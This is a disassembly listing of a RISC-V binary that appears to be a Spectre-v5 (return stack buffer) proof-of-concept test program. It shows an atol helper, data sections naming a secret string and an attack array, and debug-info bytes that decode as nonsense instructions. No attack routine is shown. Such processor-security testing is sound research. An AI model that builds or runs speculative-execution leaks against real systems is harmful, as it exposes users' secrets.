    80002692:	06f71263          	bne	a4,a5,800026f6 <atol+0xb4>
    sign = *str == '-';
    80002696:	fd843783          	ld	a5,-40(s0)
    8000269a:	0007c783          	lbu	a5,0(a5)
    8000269e:	0007871b          	sext.w	a4,a5
    800026a2:	02d00793          	li	a5,45
    800026a6:	40f707b3          	sub	a5,a4,a5
    800026aa:	0017b793          	seqz	a5,a5
    800026ae:	0ff7f793          	andi	a5,a5,255
    800026b2:	fef42223          	sw	a5,-28(s0)
    str++;
    800026b6:	fd843783          	ld	a5,-40(s0)
    800026ba:	0785                	addi	a5,a5,1
    800026bc:	fcf43c23          	sd	a5,-40(s0)
  }

  while (*str) {
    800026c0:	a81d                	j	800026f6 <atol+0xb4>
    res *= 10;
    800026c2:	fe843703          	ld	a4,-24(s0)
    800026c6:	87ba                	mv	a5,a4
    800026c8:	078a                	slli	a5,a5,0x2
    800026ca:	97ba                	add	a5,a5,a4
    800026cc:	0786                	slli	a5,a5,0x1
    800026ce:	fef43423          	sd	a5,-24(s0)
    res += *str++ - '0';
    800026d2:	fd843783          	ld	a5,-40(s0)
    800026d6:	00178713          	addi	a4,a5,1
    800026da:	fce43c23          	sd	a4,-40(s0)
    800026de:	0007c783          	lbu	a5,0(a5)
    800026e2:	2781                	sext.w	a5,a5
    800026e4:	fd07879b          	addiw	a5,a5,-48
    800026e8:	2781                	sext.w	a5,a5
    800026ea:	873e                	mv	a4,a5
    800026ec:	fe843783          	ld	a5,-24(s0)
    800026f0:	97ba                	add	a5,a5,a4
    800026f2:	fef43423          	sd	a5,-24(s0)
  while (*str) {
    800026f6:	fd843783          	ld	a5,-40(s0)
    800026fa:	0007c783          	lbu	a5,0(a5)
    800026fe:	f3f1                	bnez	a5,800026c2 <atol+0x80>
  }

  return sign ? -res : res;
    80002700:	fe442783          	lw	a5,-28(s0)
    80002704:	2781                	sext.w	a5,a5
    80002706:	c791                	beqz	a5,80002712 <atol+0xd0>
    80002708:	fe843783          	ld	a5,-24(s0)
    8000270c:	40f007b3          	neg	a5,a5
    80002710:	a019                	j	80002716 <atol+0xd4>
    80002712:	fe843783          	ld	a5,-24(s0)
}
    80002716:	853e                	mv	a0,a5
    80002718:	7422                	ld	s0,40(sp)
    8000271a:	6145                	addi	sp,sp,48
    8000271c:	8082                	ret

Disassembly of section .rodata:

0000000080002720 <.rodata>:
    80002720:	2221                	addiw	tp,tp,8
    80002722:	69685423          	0x69685423
    80002726:	54734973          	0x54734973
    8000272a:	6568                	ld	a0,200(a0)
    8000272c:	6142                	ld	sp,16(sp)
    8000272e:	7962                	ld	s2,56(sp)
    80002730:	6f42                	ld	t5,16(sp)
    80002732:	72656d6f          	jal	s10,80058e58 <_end+0x3dbd8>
    80002736:	6554                	ld	a3,136(a0)
    80002738:	00007473          	csrrci	s0,ustatus,0
    8000273c:	0000                	unimp
    8000273e:	0000                	unimp
    80002740:	3d3d                	addiw	s10,s10,-17
    80002742:	3d3d                	addiw	s10,s10,-17
    80002744:	3d3d                	addiw	s10,s10,-17
    80002746:	3d3d                	addiw	s10,s10,-17
    80002748:	3d3d                	addiw	s10,s10,-17
    8000274a:	3d3d                	addiw	s10,s10,-17
    8000274c:	3d3d                	addiw	s10,s10,-17
    8000274e:	3d3d                	addiw	s10,s10,-17
    80002750:	203d                	0x203d
    80002752:	6854                	ld	a3,144(s0)
    80002754:	7369                	lui	t1,0xffffa
    80002756:	6920                	ld	s0,80(a0)
    80002758:	20612073          	csrs	0x206,sp
    8000275c:	4f50                	lw	a2,28(a4)
    8000275e:	666f2043          	fmadd.q	ft0,ft10,ft6,fa2,rdn
    80002762:	7320                	ld	s0,96(a4)
    80002764:	6570                	ld	a2,200(a0)
    80002766:	65727463          	bleu	s7,tp,80002dae <dummyMem+0x36e>
    8000276a:	765f 2035 5228      	0x52282035765f
    80002770:	7465                	lui	s0,0xffff9
    80002772:	7275                	lui	tp,0xffffd
    80002774:	206e                	fld	ft0,216(sp)
    80002776:	63617453          	0x63617453
    8000277a:	7542206b          	0x7542206b
    8000277e:	6666                	ld	a2,88(sp)
    80002780:	7265                	lui	tp,0xffff9
    80002782:	2029                	0x2029
    80002784:	3d3d                	addiw	s10,s10,-17
    80002786:	3d3d                	addiw	s10,s10,-17
    80002788:	3d3d                	addiw	s10,s10,-17
    8000278a:	3d3d                	addiw	s10,s10,-17
    8000278c:	3d3d                	addiw	s10,s10,-17
    8000278e:	3d3d                	addiw	s10,s10,-17
    80002790:	3d3d                	addiw	s10,s10,-17
    80002792:	3d3d                	addiw	s10,s10,-17
    80002794:	3d3d                	addiw	s10,s10,-17
    80002796:	3d3d                	addiw	s10,s10,-17
    80002798:	3d3d                	addiw	s10,s10,-17
    8000279a:	3d3d                	addiw	s10,s10,-17
    8000279c:	203d                	0x203d
    8000279e:	000a                	c.slli	zero,0x2
    800027a0:	6874                	ld	a3,208(s0)
    800027a2:	2065                	0x2065
    800027a4:	72636573          	csrrsi	a0,0x726,6
    800027a8:	7465                	lui	s0,0xffff9
    800027aa:	6b20                	ld	s0,80(a4)
    800027ac:	7965                	lui	s2,0xffff9
    800027ae:	6920                	ld	s0,80(a0)
    800027b0:	73253a73          	csrrc	s4,0x732,a0
    800027b4:	0a20                	addi	s0,sp,280
    800027b6:	0000                	unimp
    800027b8:	3b305b1b          	0x3b305b1b
    800027bc:	333b3233          	0x333b3233
    800027c0:	6d32                	ld	s10,264(sp)
    800027c2:	6176                	ld	sp,344(sp)
    800027c4:	6464                	ld	s1,200(s0)
    800027c6:	5b72                	lw	s6,60(sp)
    800027c8:	3025                	0x3025
    800027ca:	3031                	0x3031
    800027cc:	5d70                	lw	a2,124(a0)
    800027ce:	6f3a                	ld	t5,392(sp)
    800027d0:	6666                	ld	a2,88(sp)
    800027d2:	28746573          	csrrsi	a0,0x287,8
    800027d6:	6c25                	lui	s8,0x9
    800027d8:	2975                	addiw	s2,s2,29
    800027da:	203a                	fld	ft0,392(sp)
    800027dc:	746e6177          	0x746e6177
    800027e0:	2528                	fld	fa0,72(a0)
    800027e2:	3a202963          	0x3a202963
    800027e6:	2820                	fld	fs0,80(s0)
    800027e8:	6968                	ld	a0,208(a0)
    800027ea:	2d74                	fld	fa3,216(a0)
    800027ec:	6974                	ld	a3,208(a0)
    800027ee:	656d                	lui	a0,0x1b
    800027f0:	53412c73          	csrrs	s8,0x534,sp
    800027f4:	4349                	li	t1,18
    800027f6:	68632c43          	fmadd.s	fs8,ft6,ft6,fa3,rdn
    800027fa:	7261                	lui	tp,0xffff8
    800027fc:	2029                	0x2029
    800027fe:	203d                	0x203d
    80002800:	2e31                	addiw	t3,t3,12
    80002802:	2528                	fld	fa0,72(a0)
    80002804:	756c                	ld	a1,232(a0)
    80002806:	202c                	fld	fa1,64(s0)
    80002808:	6425                	lui	s0,0x9
    8000280a:	202c                	fld	fa1,64(s0)
    8000280c:	6325                	lui	t1,0x9
    8000280e:	2029                	0x2029
    80002810:	2e32                	fld	ft8,264(sp)
    80002812:	2528                	fld	fa0,72(a0)
    80002814:	756c                	ld	a1,232(a0)
    80002816:	202c                	fld	fa1,64(s0)
    80002818:	6425                	lui	s0,0x9
    8000281a:	202c                	fld	fa1,64(s0)
    8000281c:	6325                	lui	t1,0x9
    8000281e:	1b29                	addi	s6,s6,-22
    80002820:	000a6d5b          	0xa6d5b
    80002824:	0000                	unimp
    80002826:	0000                	unimp
    80002828:	3b305b1b          	0x3b305b1b
    8000282c:	333b3233          	0x333b3233
    80002830:	6d31                	lui	s10,0xc
    80002832:	6176                	ld	sp,344(sp)
    80002834:	6464                	ld	s1,200(s0)
    80002836:	5b72                	lw	s6,60(sp)
    80002838:	3025                	0x3025
    8000283a:	3031                	0x3031
    8000283c:	5d70                	lw	a2,124(a0)
    8000283e:	6f3a                	ld	t5,392(sp)
    80002840:	6666                	ld	a2,88(sp)
    80002842:	28746573          	csrrsi	a0,0x287,8
    80002846:	6c25                	lui	s8,0x9
    80002848:	2975                	addiw	s2,s2,29
    8000284a:	203a                	fld	ft0,392(sp)
    8000284c:	746e6177          	0x746e6177
    80002850:	2528                	fld	fa0,72(a0)
    80002852:	3a202963          	0x3a202963
    80002856:	2820                	fld	fs0,80(s0)
    80002858:	6968                	ld	a0,208(a0)
    8000285a:	2d74                	fld	fa3,216(a0)
    8000285c:	6974                	ld	a3,208(a0)
    8000285e:	656d                	lui	a0,0x1b
    80002860:	53412c73          	csrrs	s8,0x534,sp
    80002864:	4349                	li	t1,18
    80002866:	68632c43          	fmadd.s	fs8,ft6,ft6,fa3,rdn
    8000286a:	7261                	lui	tp,0xffff8
    8000286c:	2029                	0x2029
    8000286e:	203d                	0x203d
    80002870:	2e31                	addiw	t3,t3,12
    80002872:	2528                	fld	fa0,72(a0)
    80002874:	756c                	ld	a1,232(a0)
    80002876:	202c                	fld	fa1,64(s0)
    80002878:	6425                	lui	s0,0x9
    8000287a:	202c                	fld	fa1,64(s0)
    8000287c:	6325                	lui	t1,0x9
    8000287e:	2029                	0x2029
    80002880:	2e32                	fld	ft8,264(sp)
    80002882:	2528                	fld	fa0,72(a0)
    80002884:	756c                	ld	a1,232(a0)
    80002886:	202c                	fld	fa1,64(s0)
    80002888:	6425                	lui	s0,0x9
    8000288a:	202c                	fld	fa1,64(s0)
    8000288c:	6325                	lui	t1,0x9
    8000288e:	1b29                	addi	s6,s6,-22
    80002890:	000a6d5b          	0xa6d5b
    80002894:	0000                	unimp
    80002896:	0000                	unimp
    80002898:	636d                	lui	t1,0x1b
    8000289a:	6379                	lui	t1,0x1e
    8000289c:	656c                	ld	a1,200(a0)
    8000289e:	0000                	unimp
    800028a0:	696d                	lui	s2,0x1b
    800028a2:	736e                	ld	t1,248(sp)
    800028a4:	7274                	ld	a3,224(a2)
    800028a6:	7465                	lui	s0,0xffff9
	...
    800028b0:	6d49                	lui	s10,0x12
    800028b2:	6c70                	ld	a2,216(s0)
    800028b4:	6d65                	lui	s10,0x19
    800028b6:	6e65                	lui	t3,0x19
    800028b8:	2074                	fld	fa3,192(s0)
    800028ba:	616d                	addi	sp,sp,240
    800028bc:	6e69                	lui	t3,0x1a
    800028be:	2928                	fld	fa0,80(a0)
    800028c0:	202c                	fld	fa1,64(s0)
    800028c2:	6f66                	ld	t5,88(sp)
    800028c4:	000a216f          	jal	sp,800a48c4 <_end+0x89644>
    800028c8:	7325                	lui	t1,0xfffe9
    800028ca:	3d20                	fld	fs0,120(a0)
    800028cc:	2520                	fld	fs0,72(a0)
    800028ce:	646c                	ld	a1,200(s0)
    800028d0:	000a                	c.slli	zero,0x2
    800028d2:	0000                	unimp
    800028d4:	0000                	unimp
    800028d6:	0000                	unimp
    800028d8:	6e28                	ld	a0,88(a2)
    800028da:	6c75                	lui	s8,0x1d
    800028dc:	296c                	fld	fa1,208(a0)
    800028de:	0000                	unimp
    800028e0:	f728                	sd	a0,104(a4)
    800028e2:	ffff                	0xffff
    800028e4:	f912                	sd	tp,176(sp)
    800028e6:	ffff                	0xffff
    800028e8:	f904                	sd	s1,48(a0)
    800028ea:	ffff                	0xffff
    800028ec:	f912                	sd	tp,176(sp)
    800028ee:	ffff                	0xffff
    800028f0:	f912                	sd	tp,176(sp)
    800028f2:	ffff                	0xffff
    800028f4:	f912                	sd	tp,176(sp)
    800028f6:	ffff                	0xffff
    800028f8:	f912                	sd	tp,176(sp)
    800028fa:	ffff                	0xffff
    800028fc:	f704                	sd	s1,40(a4)
    800028fe:	ffff                	0xffff
    80002900:	f912                	sd	tp,176(sp)
    80002902:	ffff                	0xffff
    80002904:	f912                	sd	tp,176(sp)
    80002906:	ffff                	0xffff
    80002908:	f6a2                	sd	s0,360(sp)
    8000290a:	ffff                	0xffff
    8000290c:	f718                	sd	a4,40(a4)
    8000290e:	ffff                	0xffff
    80002910:	f912                	sd	tp,176(sp)
    80002912:	ffff                	0xffff
    80002914:	f6ac                	sd	a1,104(a3)
    80002916:	ffff                	0xffff
    80002918:	f6b6                	sd	a3,360(sp)
    8000291a:	ffff                	0xffff
    8000291c:	f6b6                	sd	a3,360(sp)
    8000291e:	ffff                	0xffff
    80002920:	f6b6                	sd	a3,360(sp)
    80002922:	ffff                	0xffff
    80002924:	f6b6                	sd	a3,360(sp)
    80002926:	ffff                	0xffff
    80002928:	f6b6                	sd	a3,360(sp)
    8000292a:	ffff                	0xffff
    8000292c:	f6b6                	sd	a3,360(sp)
    8000292e:	ffff                	0xffff
    80002930:	f6b6                	sd	a3,360(sp)
    80002932:	ffff                	0xffff
    80002934:	f6b6                	sd	a3,360(sp)
    80002936:	ffff                	0xffff
    80002938:	f6b6                	sd	a3,360(sp)
    8000293a:	ffff                	0xffff
    8000293c:	f912                	sd	tp,176(sp)
    8000293e:	ffff                	0xffff
    80002940:	f912                	sd	tp,176(sp)
    80002942:	ffff                	0xffff
    80002944:	f912                	sd	tp,176(sp)
    80002946:	ffff                	0xffff
    80002948:	f912                	sd	tp,176(sp)
    8000294a:	ffff                	0xffff
    8000294c:	f912                	sd	tp,176(sp)
    8000294e:	ffff                	0xffff
    80002950:	f912                	sd	tp,176(sp)
    80002952:	ffff                	0xffff
    80002954:	f912                	sd	tp,176(sp)
    80002956:	ffff                	0xffff
    80002958:	f912                	sd	tp,176(sp)
    8000295a:	ffff                	0xffff
    8000295c:	f912                	sd	tp,176(sp)
    8000295e:	ffff                	0xffff
    80002960:	f912                	sd	tp,176(sp)
    80002962:	ffff                	0xffff
    80002964:	f912                	sd	tp,176(sp)
    80002966:	ffff                	0xffff
    80002968:	f912                	sd	tp,176(sp)
    8000296a:	ffff                	0xffff
    8000296c:	f912                	sd	tp,176(sp)
    8000296e:	ffff                	0xffff
    80002970:	f912                	sd	tp,176(sp)
    80002972:	ffff                	0xffff
    80002974:	f912                	sd	tp,176(sp)
    80002976:	ffff                	0xffff
    80002978:	f912                	sd	tp,176(sp)
    8000297a:	ffff                	0xffff
    8000297c:	f912                	sd	tp,176(sp)
    8000297e:	ffff                	0xffff
    80002980:	f912                	sd	tp,176(sp)
    80002982:	ffff                	0xffff
    80002984:	f912                	sd	tp,176(sp)
    80002986:	ffff                	0xffff
    80002988:	f912                	sd	tp,176(sp)
    8000298a:	ffff                	0xffff
    8000298c:	f912                	sd	tp,176(sp)
    8000298e:	ffff                	0xffff
    80002990:	f912                	sd	tp,176(sp)
    80002992:	ffff                	0xffff
    80002994:	f912                	sd	tp,176(sp)
    80002996:	ffff                	0xffff
    80002998:	f912                	sd	tp,176(sp)
    8000299a:	ffff                	0xffff
    8000299c:	f912                	sd	tp,176(sp)
    8000299e:	ffff                	0xffff
    800029a0:	f912                	sd	tp,176(sp)
    800029a2:	ffff                	0xffff
    800029a4:	f912                	sd	tp,176(sp)
    800029a6:	ffff                	0xffff
    800029a8:	f912                	sd	tp,176(sp)
    800029aa:	ffff                	0xffff
    800029ac:	f912                	sd	tp,176(sp)
    800029ae:	ffff                	0xffff
    800029b0:	f912                	sd	tp,176(sp)
    800029b2:	ffff                	0xffff
    800029b4:	f912                	sd	tp,176(sp)
    800029b6:	ffff                	0xffff
    800029b8:	f912                	sd	tp,176(sp)
    800029ba:	ffff                	0xffff
    800029bc:	f912                	sd	tp,176(sp)
    800029be:	ffff                	0xffff
    800029c0:	f912                	sd	tp,176(sp)
    800029c2:	ffff                	0xffff
    800029c4:	f912                	sd	tp,176(sp)
    800029c6:	ffff                	0xffff
    800029c8:	f912                	sd	tp,176(sp)
    800029ca:	ffff                	0xffff
    800029cc:	f912                	sd	tp,176(sp)
    800029ce:	ffff                	0xffff
    800029d0:	f912                	sd	tp,176(sp)
    800029d2:	ffff                	0xffff
    800029d4:	f912                	sd	tp,176(sp)
    800029d6:	ffff                	0xffff
    800029d8:	f912                	sd	tp,176(sp)
    800029da:	ffff                	0xffff
    800029dc:	f912                	sd	tp,176(sp)
    800029de:	ffff                	0xffff
    800029e0:	f758                	sd	a4,168(a4)
    800029e2:	ffff                	0xffff
    800029e4:	f858                	sd	a4,176(s0)
    800029e6:	ffff                	0xffff
    800029e8:	f912                	sd	tp,176(sp)
    800029ea:	ffff                	0xffff
    800029ec:	f912                	sd	tp,176(sp)
    800029ee:	ffff                	0xffff
    800029f0:	f912                	sd	tp,176(sp)
    800029f2:	ffff                	0xffff
    800029f4:	f912                	sd	tp,176(sp)
    800029f6:	ffff                	0xffff
    800029f8:	f912                	sd	tp,176(sp)
    800029fa:	ffff                	0xffff
    800029fc:	f912                	sd	tp,176(sp)
    800029fe:	ffff                	0xffff
    80002a00:	f912                	sd	tp,176(sp)
    80002a02:	ffff                	0xffff
    80002a04:	f74c                	sd	a1,168(a4)
    80002a06:	ffff                	0xffff
    80002a08:	f912                	sd	tp,176(sp)
    80002a0a:	ffff                	0xffff
    80002a0c:	f912                	sd	tp,176(sp)
    80002a0e:	ffff                	0xffff
    80002a10:	f8a0                	sd	s0,112(s1)
    80002a12:	ffff                	0xffff
    80002a14:	f8a8                	sd	a0,112(s1)
    80002a16:	ffff                	0xffff
    80002a18:	f912                	sd	tp,176(sp)
    80002a1a:	ffff                	0xffff
    80002a1c:	f912                	sd	tp,176(sp)
    80002a1e:	ffff                	0xffff
    80002a20:	f774                	sd	a3,232(a4)
    80002a22:	ffff                	0xffff
    80002a24:	f912                	sd	tp,176(sp)
    80002a26:	ffff                	0xffff
    80002a28:	f898                	sd	a4,48(s1)
    80002a2a:	ffff                	0xffff
    80002a2c:	f912                	sd	tp,176(sp)
    80002a2e:	ffff                	0xffff
    80002a30:	f912                	sd	tp,176(sp)
    80002a32:	ffff                	0xffff
    80002a34:	f8ca                	sd	s2,112(sp)
    80002a36:	ffff                	0xffff

Disassembly of section .sdata:

0000000080002a38 <secretString>:
char* secretString = "!\"#ThisIsTheBabyBoomerTest";
    80002a38:	2720                	fld	fs0,72(a4)
    80002a3a:	8000                	0x8000
    80002a3c:	0000                	unimp
	...

Disassembly of section .bss:

0000000080002a40 <dummyMem>:
	...

0000000080016a40 <attackArray>:
	...

000000008001aa40 <results.2495>:
	...

000000008001b240 <counters>:
	...

000000008001b250 <counter_names>:
	...

000000008001b260 <count.2896>:
    8001b260:	0000                	unimp
	...

000000008001b264 <sense.2895>:
    8001b264:	0000                	unimp
	...

Disassembly of section .tbss:

000000008001b280 <_tls_data>:
	...

Disassembly of section .debug_info:

0000000000000000 <.debug_info>:
       0:	0c89                	addi	s9,s9,2
       2:	0000                	unimp
       4:	0004                	0x4
       6:	0000                	unimp
       8:	0000                	unimp
       a:	0108                	addi	a0,sp,128
       c:	0286                	slli	t0,t0,0x1
       e:	0000                	unimp
      10:	8a0c                	0x8a0c
      12:	0001                	nop
      14:	6c00                	ld	s0,24(s0)
      16:	0004                	0x4
      18:	4800                	lw	s0,16(s0)
      1a:	0010                	0x10
      1c:	0080                	addi	s0,sp,64
      1e:	0000                	unimp
      20:	9400                	0x9400
      22:	0004                	0x4
	...
      2c:	0200                	addi	s0,sp,256
      2e:	0601                	addi	a2,a2,0
      30:	038d                	addi	t2,t2,3
      32:	0000                	unimp
      34:	00002803          	lw	a6,0(zero) # 0 <_tdata_begin>
      38:	0300                	addi	s0,sp,384
      3a:	00003f2b          	0x3f2b
      3e:	0200                	addi	s0,sp,256
      40:	0801                	addi	a6,a6,0
      42:	0000038b          	0x38b
      46:	0202                	slli	tp,tp,0x0
      48:	b005                	j	fffffffffffff868 <_end+0xffffffff7ffe45e8>
      4a:	02000003          	lb	zero,32(zero) # 20 <_tdata_begin+0x20>
      4e:	0702                	slli	a4,a4,0x0
      50:	021c                	addi	a5,sp,256
      52:	0000                	unimp
      54:	0404                	addi	s1,sp,512
      56:	6905                	lui	s2,0x1
      58:	746e                	ld	s0,248(sp)
      5a:	0200                	addi	s0,sp,256
      5c:	0704                	addi	s1,sp,896
      5e:	0066                	c.slli	zero,0x19
      60:	0000                	unimp
      62:	0802                	slli	a6,a6,0x0
      64:	db05                	beqz	a4,ffffffffffffff94 <_end+0xffffffff7ffe4d14>
      66:	0000                	unimp
      68:	0300                	addi	s0,sp,384
      6a:	00000357          	0x357
      6e:	00746903          	lwu	s2,7(s0) # ffffffffffff9007 <_end+0xffffffff7ffddd87>
      72:	0000                	unimp
      74:	0802                	slli	a6,a6,0x0
      76:	00006107          	0x6107
      7a:	0200                	addi	s0,sp,256
      7c:	0508                	addi	a0,sp,640
      7e:	00d6                	slli	ra,ra,0x15
      80:	0000                	unimp
      82:	1002                	c.slli	zero,0x20
      84:	0a04                	addi	s1,sp,272
      86:	03000003          	lb	zero,48(zero) # 30 <_tdata_begin+0x30>
      8a:	036c                	addi	a1,sp,396
      8c:	0000                	unimp
      8e:	0704                	addi	s1,sp,896
      90:	0054                	addi	a3,sp,4
      92:	0000                	unimp
      94:	00034603          	lbu	a2,0(t1) # fffffffffffe9000 <_end+0xffffffff7ffcdd80>
      98:	0500                	addi	s0,sp,640
      9a:	622c                	ld	a1,64(a2)
      9c:	0000                	unimp
      9e:	0300                	addi	s0,sp,384
      a0:	0000049b          	sext.w	s1,zero
      a4:	7205                	lui	tp,0xfffe1
      a6:	0062                	c.slli	zero,0x18
      a8:	0000                	unimp
      aa:	00053d03          	ld	s10,0(a0) # 1b000 <_tbss_end+0x1af7c>
      ae:	0500                	addi	s0,sp,640
      b0:	6291                	lui	t0,0x4
      b2:	0000                	unimp
      b4:	0500                	addi	s0,sp,640
      b6:	026a                	slli	tp,tp,0x1a
      b8:	0000                	unimp
      ba:	6506                	ld	a0,64(sp)
      bc:	5b01                	li	s6,-32
      be:	0000                	unimp
      c0:	0600                	addi	s0,sp,768
      c2:	0504                	addi	s1,sp,640
      c4:	e0a6                	sd	s1,64(sp)
      c6:	0000                	unimp
      c8:	0700                	addi	s0,sp,896
      ca:	0264                	addi	s1,sp,268
      cc:	0000                	unimp
      ce:	a805                	j	fe <_tbss_end+0x7a>
      d0:	00b5                	addi	ra,ra,13
      d2:	0000                	unimp
      d4:	0001f007          	0x1f007
      d8:	0500                	addi	s0,sp,640
      da:	e0a9                	bnez	s1,11c <_tbss_end+0x98>
      dc:	0000                	unimp
      de:	0000                	unimp
      e0:	3f08                	fld	fa0,56(a4)
      e2:	0000                	unimp
      e4:	f000                	sd	s0,32(s0)
      e6:	0000                	unimp
      e8:	0900                	addi	s0,sp,144
      ea:	0074                	addi	a3,sp,12
      ec:	0000                	unimp
      ee:	080a0003          	lb	zero,128(s4)
      f2:	a305                	j	612 <_tbss_end+0x58e>
      f4:	0111                	addi	sp,sp,4
      f6:	0000                	unimp
      f8:	0004560b          	0x4560b
      fc:	0500                	addi	s0,sp,640
      fe:	54a5                	li	s1,-23
     100:	0000                	unimp
     102:	0000                	unimp
     104:	00045e0b          	0x45e0b
     108:	0500                	addi	s0,sp,640
     10a:	c1aa                	sw	a0,192(sp)
     10c:	0000                	unimp
     10e:	0400                	addi	s0,sp,512
     110:	0300                	addi	s0,sp,384
     112:	03d8                	addi	a4,sp,452
     114:	0000                	unimp
     116:	ab05                	j	646 <_tbss_end+0x5c2>
     118:	00f0                	addi	a2,sp,76
     11a:	0000                	unimp
     11c:	0001a703          	lw	a4,0(gp) # 80003238 <__global_pointer$>
     120:	0500                	addi	s0,sp,640
     122:	000089af          	0x89af
     126:	0c00                	addi	s0,sp,528
     128:	0308                	addi	a0,sp,384
     12a:	04e8                	addi	a0,sp,588
     12c:	0000                	unimp
     12e:	005b1907          	0x5b1907
     132:	0000                	unimp
     134:	b80d                	j	fffffffffffff966 <_end+0xffffffff7ffe46e6>
     136:	0001                	nop
     138:	2000                	fld	fs0,0(s0)
     13a:	01872f07          	flw	ft10,24(a4)
     13e:	0000                	unimp
     140:	0003f90b          	0x3f90b
     144:	0700                	addi	s0,sp,896
     146:	8731                	srai	a4,a4,0xc
     148:	0001                	nop
     14a:	0000                	unimp
     14c:	5f0e                	lw	t5,224(sp)
     14e:	3207006b          	0x3207006b
     152:	0054                	addi	a3,sp,4
     154:	0000                	unimp
     156:	0b08                	addi	a0,sp,400
     158:	0441                	addi	s0,s0,16
     15a:	0000                	unimp
     15c:	00543207          	fld	ft4,5(s0)
     160:	0000                	unimp
     162:	0b0c                	addi	a1,sp,400
     164:	0000019b          	sext.w	gp,zero
     168:	00543207          	fld	ft4,5(s0)
     16c:	0000                	unimp
     16e:	0b10                	addi	a2,sp,400
     170:	0528                	addi	a0,sp,648
     172:	0000                	unimp
     174:	00543207          	fld	ft4,5(s0)
     178:	0000                	unimp
     17a:	0e14                	addi	a3,sp,784
     17c:	785f 0700 8d33      	0x8d330700785f
     182:	0001                	nop
     184:	1800                	addi	s0,sp,48
     186:	0f00                	addi	s0,sp,912
     188:	3408                	fld	fa0,40(s0)
     18a:	0001                	nop
     18c:	0800                	addi	s0,sp,16
     18e:	0129                	addi	sp,sp,10
     190:	0000                	unimp
     192:	019d                	addi	gp,gp,7
     194:	0000                	unimp
     196:	7409                	lui	s0,0xfffe2
     198:	0000                	unimp
     19a:	0000                	unimp
     19c:	0d00                	addi	s0,sp,656
     19e:	01df 0000 0724      	0x724000001df
     1a4:	00021637          	lui	a2,0x21
     1a8:	0b00                	addi	s0,sp,400
     1aa:	000000c3          	fmadd.s	ft1,ft0,ft0,ft0,rne
     1ae:	00543907          	fld	fs2,5(s0) # fffffffffffe2005 <_end+0xffffffff7ffc6d85>
     1b2:	0000                	unimp
     1b4:	0b00                	addi	s0,sp,400
     1b6:	04ad                	addi	s1,s1,11
     1b8:	0000                	unimp
     1ba:	00543a07          	fld	fs4,5(s0)
     1be:	0000                	unimp
     1c0:	0b04                	addi	s1,sp,400
     1c2:	00f6                	slli	ra,ra,0x1d
     1c4:	0000                	unimp
     1c6:	00543b07          	fld	fs6,5(s0)
     1ca:	0000                	unimp
     1cc:	0b08                	addi	a0,sp,400
     1ce:	05b4                	addi	a3,sp,712
     1d0:	0000                	unimp
     1d2:	00543c07          	fld	fs8,5(s0)
     1d6:	0000                	unimp
     1d8:	0b0c                	addi	a1,sp,400
     1da:	032a                	slli	t1,t1,0xa
     1dc:	0000                	unimp
     1de:	00543d07          	fld	fs10,5(s0)
     1e2:	0000                	unimp
     1e4:	0b10                	addi	a2,sp,400
     1e6:	000004a3          	sb	zero,9(zero) # 9 <_tdata_begin+0x9>
     1ea:	00543e07          	fld	ft8,5(s0)
     1ee:	0000                	unimp
     1f0:	0b14                	addi	a3,sp,400
     1f2:	052d                	addi	a0,a0,11
     1f4:	0000                	unimp
     1f6:	00543f07          	fld	ft10,5(s0)
     1fa:	0000                	unimp
     1fc:	0b18                	addi	a4,sp,400
     1fe:	03ba                	slli	t2,t2,0xe
     200:	0000                	unimp
     202:	00544007          	flq	ft0,5(s0)
     206:	0000                	unimp
     208:	0b1c                	addi	a5,sp,400
     20a:	0568                	addi	a0,sp,652
     20c:	0000                	unimp
     20e:	00544107          	flq	ft2,5(s0)
     212:	0000                	unimp
     214:	0020                	addi	s0,sp,8
     216:	0510                	addi	a2,sp,640
     218:	0001                	nop
     21a:	0800                	addi	s0,sp,16
     21c:	0702                	slli	a4,a4,0x0
     21e:	574a                	lw	a4,176(sp)
     220:	0002                	c.slli	zero,0x0
     222:	0b00                	addi	s0,sp,400
     224:	017d                	addi	sp,sp,31
     226:	0000                	unimp
     228:	02574b07          	flq	fs6,37(a4)
     22c:	0000                	unimp
     22e:	1100                	addi	s0,sp,160
     230:	0000                	unimp
     232:	0000                	unimp
     234:	02574c07          	flq	fs8,37(a4)
     238:	0000                	unimp
     23a:	0100                	addi	s0,sp,128
     23c:	da11                	beqz	a2,150 <_tbss_end+0xcc>
     23e:	0004                	0x4
     240:	0700                	addi	s0,sp,896
     242:	294e                	fld	fs2,208(sp)
     244:	0001                	nop
     246:	0000                	unimp
     248:	1102                	slli	sp,sp,0x20
     24a:	012a                	slli	sp,sp,0xa
     24c:	0000                	unimp
     24e:	01295107          	0x1295107
     252:	0000                	unimp
     254:	0204                	addi	s1,sp,256
     256:	0800                	addi	s0,sp,16
     258:	00000127          	0x127
     25c:	00000267          	jalr	tp,zero
     260:	7409                	lui	s0,0xfffe2
     262:	0000                	unimp
     264:	1f00                	addi	s0,sp,944
     266:	1000                	addi	s0,sp,32
     268:	00000333          	add	t1,zero,zero
     26c:	0318                	addi	a4,sp,384
     26e:	02a65d07          	0x2a65d07
     272:	0000                	unimp
     274:	0003f90b          	0x3f90b
     278:	0700                	addi	s0,sp,896
     27a:	a65e                	fsd	fs7,264(sp)
     27c:	0002                	c.slli	zero,0x0
     27e:	0000                	unimp
     280:	0004110b          	0x4110b
     284:	0700                	addi	s0,sp,896
     286:	545f 0000 0800      	0x8000000545f
     28c:	0001850b          	0x1850b
     290:	0700                	addi	s0,sp,896
     292:	ac61                	j	52a <_tbss_end+0x4a6>
     294:	0002                	c.slli	zero,0x0
     296:	1000                	addi	s0,sp,32
     298:	0511                	addi	a0,a0,4
     29a:	0001                	nop
     29c:	0700                	addi	s0,sp,896
     29e:	1662                	slli	a2,a2,0x38
     2a0:	0002                	c.slli	zero,0x0
     2a2:	1000                	addi	s0,sp,32
     2a4:	0001                	nop
     2a6:	0267080f          	0x267080f
     2aa:	0000                	unimp
     2ac:	bc08                	fsd	fa0,56(s0)
     2ae:	0002                	c.slli	zero,0x0
     2b0:	bc00                	fsd	fs0,56(s0)
     2b2:	0002                	c.slli	zero,0x0
     2b4:	0900                	addi	s0,sp,144
     2b6:	0074                	addi	a3,sp,12
     2b8:	0000                	unimp
     2ba:	001f 080f 02c2      	0x2c2080f001f
     2c0:	0000                	unimp
     2c2:	0d12                	slli	s10,s10,0x4
     2c4:	03c4                	addi	s1,sp,452
     2c6:	0000                	unimp
     2c8:	0710                	addi	a2,sp,896
     2ca:	e875                	bnez	s0,3be <_tbss_end+0x33a>
     2cc:	0002                	c.slli	zero,0x0
     2ce:	0b00                	addi	s0,sp,400
